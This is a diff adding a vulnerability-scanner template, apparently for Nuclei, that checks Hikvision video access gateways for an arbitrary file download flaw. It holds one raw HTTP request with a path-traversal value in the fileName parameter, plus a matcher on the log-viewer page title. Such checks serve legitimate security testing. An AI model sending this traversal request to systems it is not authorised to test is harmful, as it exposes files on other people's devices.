@@ -1,0 +1,20 @@
+id: Hikvision 视频接入网关-任意文件下载
+
+info:
+  name: Hikvision 视频接入网关-任意文件下载
+  author: wintry
+  severity: critical
+  tags: hikvision
+
+http:
+  - raw:
+      - |
+        GET /serverLog/downFile.php?fileName=../web/html/serverLog/showFile.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<title>查看日志</title>'
+
